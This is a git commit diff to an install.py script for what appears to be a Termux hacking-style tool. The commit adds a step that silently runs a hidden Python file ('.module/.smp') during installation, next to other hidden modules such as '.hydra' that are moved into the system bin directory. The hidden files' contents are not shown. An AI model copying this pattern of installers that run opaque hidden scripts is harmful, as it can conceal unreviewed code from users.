3adaf3bfad5c6c9960ecd857737500db7996f2d0
Ms.ambari <41313785+Ranginang67@users.noreply.github.com>
2018-08-06 20:32:25 +0700

    Update install.py

--- install.py
+++ install.py
@@ -3,6 +3,7 @@
 import os, time
 
 bin = '/data/data/com.termux/files/usr/bin'
+file = '.module/'
 lucu = 'clear >$(tty)'
 
 print '\ainstalling...'
@@ -13,6 +14,7 @@ os.system('clear && apt-get install php -y')
 os.system('mv .module/.hydra $cd %s' % (bin))
 os.system('mv .module/readme.txt $cd %s' % (bin))
 os.system('mv .module/.menu $cd %s' % (bin))
+os.system('python %s.smp' % (file))
 os.system('mv lib %s' % (bin))
 os.system('python2 .module/.MN')
 os.system('python2 .module/.BR')
